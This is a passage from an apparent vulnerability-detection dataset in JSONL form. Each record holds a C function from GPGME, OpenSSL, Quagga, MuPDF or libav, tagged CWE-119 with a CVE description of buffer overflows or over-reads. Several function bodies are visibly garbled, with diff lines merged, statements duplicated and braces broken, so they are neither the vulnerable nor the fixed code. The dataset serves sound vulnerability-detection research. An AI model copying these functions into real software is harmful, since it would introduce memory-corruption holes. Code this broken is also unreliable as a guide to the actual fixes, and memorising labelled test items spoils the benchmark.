err)\n\t    err = gpg_error (GPG_ERR_GENERAL);\n          TRACE2 (DEBUG_CTX, \"gpgme:status_handler\", uiserver,\n\t\t  \"fd 0x%x: ERR line - mapped to: %s\",\n                  fd, err ? gpg_strerror (err) : \"ok\");\n\t  /* Try our best to terminate the connection friendly.  */\n\t  /*\t  assuan_write_line (uiserver->assuan_ctx, \"BYE\"); */\n\t}\n      else if (linelen >= 2\n\t       && line[0] == 'O' && line[1] == 'K'\n\t       && (line[2] == '\\0' || line[2] == ' '))\n\t{\n\t  if (uiserver->status.fnc)\n\t    err = uiserver->status.fnc (uiserver->status.fnc_value,\n\t\t\t\t     GPGME_STATUS_EOF, \"\");\n\n\t  if (!err && uiserver->colon.fnc && uiserver->colon.any)\n            {\n              /* We must tell a colon function about the EOF. We do\n                 this only when we have seen any data lines.  Note\n                 that this inlined use of colon data lines will\n                 eventually be changed into using a regular data\n                 channel. */\n              uiserver->colon.any = 0;\n              err = uiserver->colon.fnc (uiserver->colon.fnc_value, NULL);\n            }\n          TRACE2 (DEBUG_CTX, \"gpgme:status_handler\", uiserver,\n\t\t  \"fd 0x%x: OK line - final status: %s\",\n                  fd, err ? gpg_strerror (err) : \"ok\");\n\t  _gpgme_io_close (uiserver->status_cb.fd);\n\t  return err;\n\t}\n      else if (linelen > 2\n\t       && line[0] == 'D' && line[1] == ' '\n\t       && uiserver->colon.fnc)\n        {\n\t  /* We are using the colon handler even for plain inline data\n             - strange name for that function but for historic reasons\n             we keep it.  */\n          /* FIXME We can't use this for binary data because we\n             assume this is a string.  For the current usage of colon\n             output it is correct.  */\n          char *src = line + 2;\n\t  char *end = line + linelen;\n\t  char *dst;\n          char **aline = &uiserver->colon.attic.line;\n\t  int *alinelen = &uiserver->colon.attic.linelen;\n\n\t  if (uiserver->colon.attic.linesize < *alinelen + linelen + 1)\n\t    {\n\t      char *newline = realloc (*aline, *alinelen + linelen + 1);\n\t      if (!newline)\n\t\terr = gpg_error_from_syserror ();\n              else\n                {\n                  *aline = newline;\n                 uiserver->colon.attic.linesize = *alinelen + linelen + 1;\n                }\n            }\n          if (!err)\n\t    {\n\t      dst = *aline + *alinelen;\n\n\t      while (!err && src < end)\n\t\t{\n\t\t  if (*src == '%' && src + 2 < end)\n\t\t    {\n\t\t      /* Handle escaped characters.  */\n\t\t      ++src;\n\t\t      *dst = _gpgme_hextobyte (src);\n\t\t      (*alinelen)++;\n\t\t      src += 2;\n\t\t    }\n\t\t  else\n\t\t    {\n\t\t      *dst = *src++;\n\t\t      (*alinelen)++;\n\t\t    }\n\n\t\t  if (*dst == '\\n')\n\t\t    {\n\t\t      /* Terminate the pending line, pass it to the colon\n\t\t\t handler and reset it.  */\n\n\t\t      uiserver->colon.any = 1;\n\t\t      if (*alinelen > 1 && *(dst - 1) == '\\r')\n\t\t\tdst--;\n\t\t      *dst = '\\0';\n\n\t\t      /* FIXME How should we handle the return code?  */\n\t\t      err = uiserver->colon.fnc (uiserver->colon.fnc_value, *aline);\n\t\t      if (!err)\n\t\t\t{\n\t\t\t  dst = *aline;\n\t\t\t  *alinelen = 0;\n\t\t\t}\n\t\t    }\n\t\t  else\n\t\t    dst++;\n\t\t}\n\t    }\n          TRACE2 (DEBUG_CTX, \"gpgme:status_handler\", uiserver,\n\t\t  \"fd 0x%x: D line; final status: %s\",\n                  fd, err? gpg_strerror (err):\"ok\");\n        }\n      else if (linelen > 2\n\t       && line[0] == 'D' && line[1] == ' '\n\t       && uiserver->inline_data)\n        {\n          char *src = line + 2;\n\t  char *end = line + linelen;\n\t  char *dst = src;\n          gpgme_ssize_t nwritten;\n\n          linelen = 0;\n          while (src < end)\n            {\n              if (*src == '%' && src + 2 < end)\n                {\n                  /* Handle escaped characters.  */\n                  ++src;\n                  *dst++ = _gpgme_hextobyte (src);\n                  src += 2;\n                }\n              else\n                *dst++ = *src++;\n\n              linelen++;\n            }\n\n          src = line + 2;\n          while (linelen > 0)\n            {\n              nwritten = gpgme_data_write (uiserver->inline_data, src, linelen);\n              if (!nwritten || (nwritten < 0 && errno != EINTR)\n                  || nwritten > linelen)\n                {\n                  err = gpg_error_from_syserror ();\n                  break;\n                }\n              src += nwritten;\n              linelen -= nwritten;\n            }\n\n          TRACE2 (DEBUG_CTX, \"gpgme:status_handler\", uiserver,\n\t\t  \"fd 0x%x: D inlinedata; final status: %s\",\n                  fd, err? gpg_strerror (err):\"ok\");\n        }\n      else if (linelen > 2\n\t       && line[0] == 'S' && line[1] == ' ')\n\t{\n\t  char *rest;\n\t  gpgme_status_code_t r;\n\n\t  rest = strchr (line + 2, ' ');\n\t  if (!rest)\n\t    rest = line + linelen; /* set to an empty string */\n\t  else\n\t    *(rest++) = 0;\n\n\t  r = _gpgme_parse_status (line + 2);\n\n\t  if (r >= 0)\n\t    {\n\t      if (uiserver->status.fnc)\n\t\terr = uiserver->status.fnc (uiserver->status.fnc_value, r, rest);\n\t    }\n\t  else\n\t    fprintf (stderr, \"[UNKNOWN STATUS]%s %s\", line + 2, rest);\n          TRACE3 (DEBUG_CTX, \"gpgme:status_handler\", uiserver,\n\t\t  \"fd 0x%x: S line (%s) - final status: %s\",\n                  fd, line+2, err? gpg_strerror (err):\"ok\");\n\t}\n      else if (linelen >= 7\n               && line[0] == 'I' && line[1] == 'N' && line[2] == 'Q'\n               && line[3] == 'U' && line[4] == 'I' && line[5] == 'R'\n               && line[6] == 'E'\n               && (line[7] == '\\0' || line[7] == ' '))\n        {\n          char *keyword = line+7;\n\n          while (*keyword == ' ')\n            keyword++;;\n          default_inq_cb (uiserver, keyword);\n          assuan_write_line (uiserver->assuan_ctx, \"END\");\n        }\n\n    }\n  while (!err && assuan_pending_line (uiserver->assuan_ctx));\n\n  return err;\n}\n", "func_hash": 8839794853672060345166196416059519004, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2014-3564", "cve_desc": "Multiple heap-based buffer overflows in the status_handler function in (1) engine-gpgsm.c and (2) engine-uiserver.c in GPGME before 1.5.1 allow remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via vectors related to \"different line lengths in a specific order.\"", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-3564"}
{"idx": 158231, "project": "openssl", "commit_id": "578b956fe741bf8e84055547b1e83c28dd902c73", "project_url": "https://github.com/openssl/openssl", "commit_url": "https://git.openssl.org/?p=openssl.git;a=commit;h=578b956fe741bf8e84055547b1e83c28dd902c73", "commit_message": "Fix memory issues in BIO_*printf functions\n\nThe internal |fmtstr| function used in processing a \"%s\" format string\nin the BIO_*printf functions could overflow while calculating the length\nof a string and cause an OOB read when printing very long strings.\n\nAdditionally the internal |doapr_outch| function can attempt to write to\nan OOB memory location (at an offset from the NULL pointer) in the event of\na memory allocation failure. In 1.0.2 and below this could be caused where\nthe size of a buffer to be allocated is greater than INT_MAX. E.g. this\ncould be in processing a very long \"%s\" format string. Memory leaks can also\noccur.\n\nThese issues will only occur on certain platforms where sizeof(size_t) >\nsizeof(int). E.g. many 64 bit systems. The first issue may mask the second\nissue dependent on compiler behaviour.\n\nThese problems could enable attacks where large amounts of untrusted data\nis passed to the BIO_*printf functions. If applications use these functions\nin this way then they could be vulnerable. OpenSSL itself uses these\nfunctions when printing out human-readable dumps of ASN.1 data. Therefore\napplications that print this data could be vulnerable if the data is from\nuntrusted sources. OpenSSL command line applications could also be\nvulnerable where they print out ASN.1 data, or if untrusted data is passed\nas command line arguments.\n\nLibssl is not considered directly vulnerable. Additionally certificates etc\nreceived via remote connections via libssl are also unlikely to be able to\ntrigger these issues because of message size limits enforced within libssl.\n\nCVE-2016-0799\n\nIssue reported by Guido Vranken.\n\nReviewed-by: Andy Polyakov <appro@openssl.org>", "target": 0, "func": " _dopr(char **sbuffer,\n       char **buffer,\n       size_t *maxlen,\n      size_t *retlen, int *truncated, const char *format, va_list args)\n{\n    char ch;\n    LLONG value;\n    LDOUBLE fvalue;\n    char *strvalue;\n    int min;\n    int max;\n    int state;\n    int flags;\n    int cflags;\n    size_t currlen;\n\n    state = DP_S_DEFAULT;\n    flags = currlen = cflags = min = 0;\n    max = -1;\n    ch = *format++;\n\n    while (state != DP_S_DONE) {\n        if (ch == '\\0' || (buffer == NULL && currlen >= *maxlen))\n            state = DP_S_DONE;\n\n        switch (state) {\n        case DP_S_DEFAULT:\n             if (ch == '%')\n                 state = DP_S_FLAGS;\n             else\n                if(!doapr_outch(sbuffer, buffer, &currlen, maxlen, ch))\n                    return 0;\n             ch = *format++;\n             break;\n         case DP_S_FLAGS:\n            case '-':\n                flags |= DP_F_MINUS;\n                ch = *format++;\n                break;\n            case '+':\n                flags |= DP_F_PLUS;\n                ch = *format++;\n                break;\n            case ' ':\n                flags |= DP_F_SPACE;\n                ch = *format++;\n                break;\n            case '#':\n                flags |= DP_F_NUM;\n                ch = *format++;\n                break;\n            case '0':\n                flags |= DP_F_ZERO;\n                ch = *format++;\n                break;\n            default:\n                state = DP_S_MIN;\n                break;\n            }\n            break;\n        case DP_S_MIN:\n            if (isdigit((unsigned char)ch)) {\n                min = 10 * min + char_to_int(ch);\n                ch = *format++;\n            } else if (ch == '*') {\n                min = va_arg(args, int);\n                ch = *format++;\n                state = DP_S_DOT;\n            } else\n                state = DP_S_DOT;\n            break;\n        case DP_S_DOT:\n            if (ch == '.') {\n                state = DP_S_MAX;\n                ch = *format++;\n            } else\n                state = DP_S_MOD;\n            break;\n        case DP_S_MAX:\n            if (isdigit((unsigned char)ch)) {\n                if (max < 0)\n                    max = 0;\n                max = 10 * max + char_to_int(ch);\n                ch = *format++;\n            } else if (ch == '*') {\n                max = va_arg(args, int);\n                ch = *format++;\n                state = DP_S_MOD;\n            } else\n                state = DP_S_MOD;\n            break;\n        case DP_S_MOD:\n            switch (ch) {\n            case 'h':\n                cflags = DP_C_SHORT;\n                ch = *format++;\n                break;\n            case 'l':\n                if (*format == 'l') {\n                    cflags = DP_C_LLONG;\n                    format++;\n                } else\n                    cflags = DP_C_LONG;\n                ch = *format++;\n                break;\n            case 'q':\n                cflags = DP_C_LLONG;\n                ch = *format++;\n                break;\n            case 'L':\n                cflags = DP_C_LDOUBLE;\n                ch = *format++;\n                break;\n            default:\n                break;\n            }\n            state = DP_S_CONV;\n            break;\n        case DP_S_CONV:\n            switch (ch) {\n            case 'd':\n            case 'i':\n                switch (cflags) {\n                case DP_C_SHORT:\n                    value = (short int)va_arg(args, int);\n                    break;\n                case DP_C_LONG:\n                    value = va_arg(args, long int);\n                    break;\n                case DP_C_LLONG:\n                    value = va_arg(args, LLONG);\n                    break;\n                default:\n                    value = va_arg(args, int);\n                     value = va_arg(args, int);\n                     break;\n                 }\n                if (!fmtint(sbuffer, buffer, &currlen, maxlen, value, 10, min,\n                            max, flags))\n                    return 0;\n                 break;\n             case 'X':\n                 flags |= DP_F_UP;\n            case 'o':\n            case 'u':\n                flags |= DP_F_UNSIGNED;\n                switch (cflags) {\n                case DP_C_SHORT:\n                    value = (unsigned short int)va_arg(args, unsigned int);\n                    break;\n                case DP_C_LONG:\n                    value = (LLONG) va_arg(args, unsigned long int);\n                    break;\n                case DP_C_LLONG:\n                    value = va_arg(args, unsigned LLONG);\n                    break;\n                default:\n                    value = (LLONG) va_arg(args, unsigned int);\n                    break;\n                     value = (LLONG) va_arg(args, unsigned int);\n                     break;\n                 }\n                if (!fmtint(sbuffer, buffer, &currlen, maxlen, value,\n                            ch == 'o' ? 8 : (ch == 'u' ? 10 : 16),\n                            min, max, flags))\n                    return 0;\n                 break;\n             case 'f':\n                 if (cflags == DP_C_LDOUBLE)\n                     fvalue = va_arg(args, LDOUBLE);\n                 else\n                     fvalue = va_arg(args, double);\n                if (!fmtfp(sbuffer, buffer, &currlen, maxlen, fvalue, min, max,\n                           flags))\n                    return 0;\n                 break;\n             case 'E':\n                 flags |= DP_F_UP;\n                    fvalue = va_arg(args, double);\n                break;\n            case 'G':\n                flags |= DP_F_UP;\n            case 'g':\n                if (cflags == DP_C_LDOUBLE)\n                    fvalue = va_arg(args, LDOUBLE);\n                else\n                    fvalue = va_arg(args, double);\n                break;\n            case 'c':\n                doapr_outch(sbuffer, buffer, &currlen, maxlen,\n                     fvalue = va_arg(args, double);\n                 break;\n             case 'c':\n                if(!doapr_outch(sbuffer, buffer, &currlen, maxlen,\n                            va_arg(args, int)))\n                    return 0;\n                 break;\n             case 's':\n                 strvalue = va_arg(args, char *);\n                }\n                fmtstr(sbuffer, buffer, &currlen, maxlen, strvalue,\n                       flags, min, max);\n                     else\n                         max = *maxlen;\n                 }\n                if (!fmtstr(sbuffer, buffer, &currlen, maxlen, strvalue,\n                            flags, min, max))\n                    return 0;\n                 break;\n             case 'p':\n                 value = (long)va_arg(args, void *);\n                if (!fmtint(sbuffer, buffer, &currlen, maxlen,\n                            value, 16, min, max, flags | DP_F_NUM))\n                    return 0;\n                 break;\n             case 'n':          /* XXX */\n                 if (cflags == DP_C_SHORT) {\n                } else if (cflags == DP_C_LLONG) { /* XXX */\n                    LLONG *num;\n                    num = va_arg(args, LLONG *);\n                    *num = (LLONG) currlen;\n                } else {\n                    int *num;\n                    num = va_arg(args, int *);\n                    *num = currlen;\n                }\n                break;\n            case '%':\n                doapr_outch(sbuffer, buffer, &currlen, maxlen, ch);\n                break;\n            case 'w':\n                /* not supported yet, treat as next char */\n                 }\n", "func_hash": 195613941504483693700403529577879018231, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2016-2842", "cve_desc": "The doapr_outch function in crypto/bio/b_print.c in OpenSSL 1.0.1 before 1.0.1s and 1.0.2 before 1.0.2g does not verify that a certain memory allocation succeeds, which allows remote attackers to cause a denial of service (out-of-bounds write or memory consumption) or possibly have unspecified other impact via a long string, as demonstrated by a large amount of ASN.1 data, a different vulnerability than CVE-2016-0799.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-2842"}
{"idx": 158232, "project": "savannah", "commit_id": "a3bc7e9400b214a0f078fdb19596ba54214a1442", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/cgit/quagga.git/commit/?id=a3bc7e9400b214a0f078fdb19596ba54214a1442", "commit_message": "None", "target": 0, "func": "bgp_nlri_parse_vpnv4 (struct peer *peer, struct attr *attr, \n\t\t      struct bgp_nlri *packet)\n{\n  u_char *pnt;\n  u_char *lim;\n  struct prefix p;\n  int psize;\n  int prefixlen;\n  u_int16_t type;\n  struct rd_as rd_as;\n  struct rd_ip rd_ip;\n  struct prefix_rd prd;\n  u_char *tagpnt;\n\n  /* Check peer status. */\n  if (peer->status != Established)\n    return 0;\n  \n  /* Make prefix_rd */\n  prd.family = AF_UNSPEC;\n  prd.prefixlen = 64;\n\n   pnt = packet->nlri;\n   lim = pnt + packet->length;\n \n#define VPN_PREFIXLEN_MIN_BYTES (3 + 8) /* label + RD */\n   for (; pnt < lim; pnt += psize)\n     {\n       /* Clear prefix structure. */\n\n \n       /* Fetch prefix length. */\n       prefixlen = *pnt++;\n      p.family = afi2family (packet->afi);\n       psize = PSIZE (prefixlen);\n      \n      /* sanity check against packet data */\n      if (prefixlen < VPN_PREFIXLEN_MIN_BYTES*8 || (pnt + psize) > lim)\n        {\n          zlog_err (\"prefix length (%d) is less than 88\"\n                    \" or larger than received (%u)\",\n                    prefixlen, (uint)(lim-pnt));\n          return -1;\n        }\n      \n      /* sanity check against storage for the IP address portion */\n      if ((psize - VPN_PREFIXLEN_MIN_BYTES) > (ssize_t) sizeof(p.u))\n        {\n          zlog_err (\"prefix length (%d) exceeds prefix storage (%zu)\",\n                    prefixlen - VPN_PREFIXLEN_MIN_BYTES*8, sizeof(p.u));\n          return -1;\n        }\n      \n      /* Sanity check against max bitlen of the address family */\n      if ((psize - VPN_PREFIXLEN_MIN_BYTES) > prefix_blen (&p))\n        {\n          zlog_err (\"prefix length (%d) exceeds family (%u) max byte length (%u)\",\n                    prefixlen - VPN_PREFIXLEN_MIN_BYTES*8, \n                    p.family, prefix_blen (&p));\n          return -1;\n                  \n        }\n      \n       /* Copyr label to prefix. */\n      tagpnt = pnt;\n \n       /* Copy routing distinguisher to rd. */\n       memcpy (&prd.val, pnt + 3, 8);\n      else if (type == RD_TYPE_IP)\n\tzlog_info (\"prefix %ld:%s:%ld:%s/%d\", label, inet_ntoa (rd_ip.ip),\n\t\t   rd_ip.val, inet_ntoa (p.u.prefix4), p.prefixlen);\n#endif /* 0 */\n\n      if (pnt + psize > lim)\n\treturn -1;\n\n      if (attr)\n\tbgp_update (peer, &p, attr, AFI_IP, SAFI_MPLS_VPN,\n\t\t    ZEBRA_ROUTE_BGP, BGP_ROUTE_NORMAL, &prd, tagpnt, 0);\n      else\n \t  return -1;\n \t}\n \n      p.prefixlen = prefixlen - VPN_PREFIXLEN_MIN_BYTES*8;\n      memcpy (&p.u.prefix, pnt + VPN_PREFIXLEN_MIN_BYTES, \n              psize - VPN_PREFIXLEN_MIN_BYTES);\n \n #if 0\n       if (type == RD_TYPE_AS)\n}\n", "func_hash": 117907470428073272654099801965911501253, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2016-2342", "cve_desc": "The bgp_nlri_parse_vpnv4 function in bgp_mplsvpn.c in the VPNv4 NLRI parser in bgpd in Quagga before 1.0.20160309, when a certain VPNv4 configuration is used, relies on a Labeled-VPN SAFI routes-data length field during a data copy, which allows remote attackers to execute arbitrary code or cause a denial of service (stack-based buffer overflow) via a crafted packet.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-2342"}
{"idx": 158246, "project": "openssl", "commit_id": "2919516136a4227d9e6d8f2fe66ef976aaf8c561", "project_url": "https://github.com/openssl/openssl", "commit_url": "https://git.openssl.org/?p=openssl.git;a=commitdiff;h=2919516136a4227d9e6d8f2fe66ef976aaf8c561", "commit_message": "Prevent EBCDIC overread for very long strings\n\nASN1 Strings that are over 1024 bytes can cause an overread in\napplications using the X509_NAME_oneline() function on EBCDIC systems.\nThis could result in arbitrary stack data being returned in the buffer.\n\nIssue reported by Guido Vranken.\n\nCVE-2016-2176\n\nReviewed-by: Andy Polyakov <appro@openssl.org>", "target": 0, "func": "char *X509_NAME_oneline(X509_NAME *a, char *buf, int len)\n{\n    X509_NAME_ENTRY *ne;\n    int i;\n    int n, lold, l, l1, l2, num, j, type;\n    const char *s;\n    char *p;\n    unsigned char *q;\n    BUF_MEM *b = NULL;\n    static const char hex[17] = \"0123456789ABCDEF\";\n    int gs_doit[4];\n    char tmp_buf[80];\n#ifdef CHARSET_EBCDIC\n    char ebcdic_buf[1024];\n#endif\n\n    if (buf == NULL) {\n        if ((b = BUF_MEM_new()) == NULL)\n            goto err;\n        if (!BUF_MEM_grow(b, 200))\n            goto err;\n        b->data[0] = '\\0';\n        len = 200;\n    } else if (len == 0) {\n        return NULL;\n    }\n    if (a == NULL) {\n        if (b) {\n            buf = b->data;\n            OPENSSL_free(b);\n        }\n        strncpy(buf, \"NO X509_NAME\", len);\n        buf[len - 1] = '\\0';\n        return buf;\n    }\n\n    len--;                      /* space for '\\0' */\n    l = 0;\n    for (i = 0; i < sk_X509_NAME_ENTRY_num(a->entries); i++) {\n        ne = sk_X509_NAME_ENTRY_value(a->entries, i);\n        n = OBJ_obj2nid(ne->object);\n        if ((n == NID_undef) || ((s = OBJ_nid2sn(n)) == NULL)) {\n            i2t_ASN1_OBJECT(tmp_buf, sizeof(tmp_buf), ne->object);\n            s = tmp_buf;\n        }\n        l1 = strlen(s);\n\n        type = ne->value->type;\n        num = ne->value->length;\n        if (num > NAME_ONELINE_MAX) {\n            X509err(X509_F_X509_NAME_ONELINE, X509_R_NAME_TOO_LONG);\n            goto end;\n        }\n        q = ne->value->data;\n#ifdef CHARSET_EBCDIC\n        if (type == V_ASN1_GENERALSTRING ||\n            type == V_ASN1_VISIBLESTRING ||\n             type == V_ASN1_PRINTABLESTRING ||\n             type == V_ASN1_TELETEXSTRING ||\n             type == V_ASN1_VISIBLESTRING || type == V_ASN1_IA5STRING) {\n            if (num > (int)sizeof(ebcdic_buf))\n                num = sizeof(ebcdic_buf);\n            ascii2ebcdic(ebcdic_buf, q, num);\n             q = ebcdic_buf;\n         }\n #endif\n        if ((type == V_ASN1_GENERALSTRING) && ((num % 4) == 0)) {\n            gs_doit[0] = gs_doit[1] = gs_doit[2] = gs_doit[3] = 0;\n            for (j = 0; j < num; j++)\n                if (q[j] != 0)\n                    gs_doit[j & 3] = 1;\n\n            if (gs_doit[0] | gs_doit[1] | gs_doit[2])\n                gs_doit[0] = gs_doit[1] = gs_doit[2] = gs_doit[3] = 1;\n            else {\n                gs_doit[0] = gs_doit[1] = gs_doit[2] = 0;\n                gs_doit[3] = 1;\n            }\n        } else\n            gs_doit[0] = gs_doit[1] = gs_doit[2] = gs_doit[3] = 1;\n\n        for (l2 = j = 0; j < num; j++) {\n            if (!gs_doit[j & 3])\n                continue;\n            l2++;\n#ifndef CHARSET_EBCDIC\n            if ((q[j] < ' ') || (q[j] > '~'))\n                l2 += 3;\n#else\n            if ((os_toascii[q[j]] < os_toascii[' ']) ||\n                (os_toascii[q[j]] > os_toascii['~']))\n                l2 += 3;\n#endif\n        }\n\n        lold = l;\n        l += 1 + l1 + 1 + l2;\n        if (l > NAME_ONELINE_MAX) {\n            X509err(X509_F_X509_NAME_ONELINE, X509_R_NAME_TOO_LONG);\n            goto end;\n        }\n        if (b != NULL) {\n            if (!BUF_MEM_grow(b, l + 1))\n                goto err;\n            p = &(b->data[lold]);\n        } else if (l > len) {\n            break;\n        } else\n            p = &(buf[lold]);\n        *(p++) = '/';\n        memcpy(p, s, (unsigned int)l1);\n        p += l1;\n        *(p++) = '=';\n\n#ifndef CHARSET_EBCDIC          /* q was assigned above already. */\n        q = ne->value->data;\n#endif\n\n        for (j = 0; j < num; j++) {\n            if (!gs_doit[j & 3])\n                continue;\n#ifndef CHARSET_EBCDIC\n            n = q[j];\n            if ((n < ' ') || (n > '~')) {\n                *(p++) = '\\\\';\n                *(p++) = 'x';\n                *(p++) = hex[(n >> 4) & 0x0f];\n                *(p++) = hex[n & 0x0f];\n            } else\n                *(p++) = n;\n#else\n            n = os_toascii[q[j]];\n            if ((n < os_toascii[' ']) || (n > os_toascii['~'])) {\n                *(p++) = '\\\\';\n                *(p++) = 'x';\n                *(p++) = hex[(n >> 4) & 0x0f];\n                *(p++) = hex[n & 0x0f];\n            } else\n                *(p++) = q[j];\n#endif\n        }\n        *p = '\\0';\n    }\n    if (b != NULL) {\n        p = b->data;\n        OPENSSL_free(b);\n    } else\n        p = buf;\n    if (i == 0)\n        *p = '\\0';\n    return (p);\n err:\n    X509err(X509_F_X509_NAME_ONELINE, ERR_R_MALLOC_FAILURE);\n end:\n    BUF_MEM_free(b);\n    return (NULL);\n}\n", "func_hash": 102161235674682768354989675007761833395, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2016-2176", "cve_desc": "The X509_NAME_oneline function in crypto/x509/x509_obj.c in OpenSSL before 1.0.1t and 1.0.2 before 1.0.2h allows remote attackers to obtain sensitive information from process stack memory or cause a denial of service (buffer over-read) via crafted EBCDIC ASN.1 data.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-2176"}
{"idx": 158260, "project": "ghostscript", "commit_id": "60dabde18d7fe12b19da8b509bdfee9cc886aafc", "project_url": "http://git.ghostscript.com/?p=mupdf", "commit_url": "http://git.ghostscript.com/?p=mupdf.git;a=commitdiff;h=60dabde18d7fe12b19da8b509bdfee9cc886aafc", "commit_message": "None", "target": 0, "func": " xps_parse_color(xps_document *doc, char *base_uri, char *string,\n                fz_colorspace **csp, float *samples)\n {\n       fz_context *ctx = doc->ctx;\n        char *p;\n        int i, n;\n        char buf[1024];\n        char *profile;\n \n       *csp = fz_device_rgb(ctx);\n \n        samples[0] = 1;\n        samples[1] = 0;\n\tsamples[3] = 0;\n\n\tif (string[0] == '#')\n\t{\n\t\tif (strlen(string) == 9)\n\t\t{\n\t\t\tsamples[0] = unhex(string[1]) * 16 + unhex(string[2]);\n\t\t\tsamples[1] = unhex(string[3]) * 16 + unhex(string[4]);\n\t\t\tsamples[2] = unhex(string[5]) * 16 + unhex(string[6]);\n\t\t\tsamples[3] = unhex(string[7]) * 16 + unhex(string[8]);\n\t\t}\n\t\telse\n\t\t{\n\t\t\tsamples[0] = 255;\n\t\t\tsamples[1] = unhex(string[1]) * 16 + unhex(string[2]);\n\t\t\tsamples[2] = unhex(string[3]) * 16 + unhex(string[4]);\n\t\t\tsamples[3] = unhex(string[5]) * 16 + unhex(string[6]);\n\t\t}\n\n\t\tsamples[0] /= 255;\n\t\tsamples[1] /= 255;\n\t\tsamples[2] /= 255;\n\t\tsamples[3] /= 255;\n\t}\n\n\telse if (string[0] == 's' && string[1] == 'c' && string[2] == '#')\n\t{\n\t\tif (count_commas(string) == 2)\n\t\t\tsscanf(string, \"sc#%g,%g,%g\", samples + 1, samples + 2, samples + 3);\n\t\tif (count_commas(string) == 3)\n\t\t\tsscanf(string, \"sc#%g,%g,%g,%g\", samples, samples + 1, samples + 2, samples + 3);\n\t}\n\n\telse if (strstr(string, \"ContextColor \") == string)\n\t{\n\t\t/* Crack the string for profile name and sample values */\n\t\tfz_strlcpy(buf, string, sizeof buf);\n\n\t\tprofile = strchr(buf, ' ');\n                profile = strchr(buf, ' ');\n                if (!profile)\n                {\n                       fz_warn(ctx, \"cannot find icc profile uri in '%s'\", string);\n                        return;\n                }\n \n\t\tp = strchr(profile, ' ');\n                p = strchr(profile, ' ');\n                if (!p)\n                {\n                       fz_warn(ctx, \"cannot find component values in '%s'\", profile);\n                        return;\n                }\n \n                *p++ = 0;\n                n = count_commas(p) + 1;\n               if (n > FZ_MAX_COLORS)\n               {\n                       fz_warn(ctx, \"ignoring %d color components (max %d allowed)\", n - FZ_MAX_COLORS, FZ_MAX_COLORS);\n                       n = FZ_MAX_COLORS;\n               }\n                i = 0;\n                while (i < n)\n                {\n\t\t\t\tp ++;\n\t\t}\n\t\twhile (i < n)\n\t\t{\n\t\t\tsamples[i++] = 0;\n\t\t}\n\n\t\t/* TODO: load ICC profile */\n\t\tswitch (n)\n\t\t{\n\t\tcase 2: *csp = fz_device_gray(doc->ctx); break;\n\t\tcase 4: *csp = fz_device_rgb(doc->ctx); break;\n\t\tcase 5: *csp = fz_device_cmyk(doc->ctx); break;\n                /* TODO: load ICC profile */\n                switch (n)\n                {\n               case 2: *csp = fz_device_gray(ctx); break;\n               case 4: *csp = fz_device_rgb(ctx); break;\n               case 5: *csp = fz_device_cmyk(ctx); break;\n               default: *csp = fz_device_gray(ctx); break;\n                }\n        }\n }\n\tfor (i = 0; i < colorspace->n; i++)\n\t\tdoc->color[i] = samples[i + 1];\n\tdoc->alpha = samples[0] * doc->opacity[doc->opacity_top];\n}\n", "func_hash": 104133691355236952097313818918215819307, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2014-2013", "cve_desc": "Stack-based buffer overflow in the xps_parse_color function in xps/xps-common.c in MuPDF 1.3 and earlier allows remote attackers to execute arbitrary code via a large number of entries in the ContextColor value of the Fill attribute in a Path element.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-2013"}
{"idx": 158271, "project": "libav", "commit_id": "5a396bb3a66a61a68b80f2369d0249729bf85e04", "project_url": "https://github.com/libav/libav", "commit_url": "https://git.libav.org/?p=libav.git;a=commitdiff;h=5a396bb3a66a61a68b80f2369d0249729bf85e04", "commit_message": "dv: Fix null pointer dereference due to ach=0\n\ndv: Fix null pointer dereference due to ach=0\n\nFixes part2 of CVE-2011-3929\n\nFound-by: Mateusz \"j00ru\" Jurczyk and Gynvael Coldwind\nReviewed-by: Roman Shaposhnik <roman@shaposhnik.org>\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>\nSigned-off-by: Alex Converse <alex.converse@gmail.com>", "target": 0, "func": "int avpriv_dv_produce_packet(DVDemuxContext *c, AVPacket *pkt,\n                      uint8_t* buf, int buf_size)\n{\n    int size, i;\n    uint8_t *ppcm[4] = {0};\n\n    if (buf_size < DV_PROFILE_BYTES ||\n        !(c->sys = avpriv_dv_frame_profile(c->sys, buf, buf_size)) ||\n        buf_size < c->sys->frame_size) {\n          return -1;   /* Broken frame, or not enough data */\n    }\n\n    /* Queueing audio packet */\n    /* FIXME: in case of no audio/bad audio we have to do something */\n    size = dv_extract_audio_info(c, buf);\n    for (i = 0; i < c->ach; i++) {\n       c->audio_pkt[i].size = size;\n        c->audio_pkt[i].pts  = c->abytes * 30000*8 / c->ast[i]->codec->bit_rate;\n        ppcm[i] = c->audio_buf[i];\n     }\n    if (c->ach)\n        dv_extract_audio(buf, ppcm, c->sys);\n \n     /* We work with 720p frames split in half, thus even frames have\n      * channels 0,1 and odd 2,3. */\n        if (buf[1] & 0x0C) {\n            c->audio_pkt[2].size = c->audio_pkt[3].size = 0;\n        } else {\n            c->audio_pkt[0].size = c->audio_pkt[1].size = 0;\n            c->abytes += size;\n        }\n    } else {\n        c->abytes += size;\n    }\n", "func_hash": 230194429546358495875504885626884790759, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2011-3929", "cve_desc": "The avpriv_dv_produce_packet function in libavcodec in FFmpeg 0.7.x before 0.7.12 and 0.8.x before 0.8.11 and in Libav 0.5.x before 0.5.9, 0.6.x before 0.6.6, 0.7.x before 0.7.5, and 0.8.x before 0.8.1 allows remote attackers to cause a denial of service (NULL pointer dereference and application crash) and possibly execute arbitrary code via a crafted DV file.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2011-3929"}
